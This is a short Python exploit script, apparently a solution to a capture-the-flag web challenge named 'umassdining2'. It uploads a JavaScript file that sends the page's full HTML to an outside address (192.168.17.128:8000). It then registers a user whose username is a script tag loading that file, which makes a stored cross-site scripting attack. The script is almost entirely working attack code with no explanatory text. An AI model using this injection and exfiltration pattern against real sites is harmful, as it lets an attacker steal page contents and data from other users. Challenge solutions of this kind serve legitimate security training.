import requests
from urllib.request import urljoin
from hashlib import md5

URL = "http://172.18.0.3:6942"
# URL = "http://umassdining2.web.ctf.umasscybersec.org:6942/"

class API:
    def __init__(self, username, password, url=URL):
        self.username = username
        self.password = password
        self.url = url
        self.session = requests.Session()

    def login(self):
        res = self.session.post(urljoin(self.url, "/login"), data={
            "user": self.username,
            "pass": self.password
        })
        return res.text
    def register(self):
        res = self.session.post(urljoin(self.url, "/register"), data={
            "user": self.username,
            "pass": self.password
        })
        return res.text

    def submit(self, payload, **kwargs):
        res = self.session.post(urljoin(self.url, "/submit"), files={
            'submission': payload
        }, **kwargs)
        return res.text
        
    def username_md5(self):
        return md5(self.username.encode()).hexdigest()
    
if __name__ == "__main__":
    api = API("sold", "sold")
    user_hash = api.username_md5()
    print("user hash:", user_hash)
    api.register()
    api.login()
    print(api.submit(("asd.js", "document.location = 'http://192.168.17.128:8000?c='+encodeURIComponent(document.documentElement.innerHTML)")))

    api = API(f"<script src='/uploads/{user_hash}/asd.js'></script>", "sold")
    api.register()
    api.login()
    print(api.submit(("foo.png", "foo")))